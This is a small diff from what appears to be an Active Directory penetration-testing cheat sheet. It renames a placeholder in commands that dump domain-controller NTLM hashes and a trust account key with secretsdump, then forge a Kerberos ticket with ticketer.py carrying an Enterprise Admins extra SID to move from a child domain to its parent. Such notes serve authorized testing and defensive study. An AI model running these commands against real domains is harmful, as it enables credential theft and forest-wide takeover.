@@ -58,9 +58,9 @@ secretsdump -k -no-pass -just-dc-ntlm domain.com/goldenuser@dc.parentDomain.com
 
 ```bash
 # Get trust key
-secretsdump -just-dc-user 'NETBIOSPCPARENTDOMAIN$' domain.com/user:'Pass'@dcIP
+secretsdump -just-dc-user 'TRUST$' domain.com/user:'Pass'@dcIP
 # Get Ticket
-ticketer.py -nthash <hash NETBIOSPCPARENTDOMAIN$>  \
+ticketer.py -nthash <hash TRUST$>  \
  -domain-sid <sid child domain> \
  -domain domain.com \
  -extra-sid <sid parent domain>-519 \
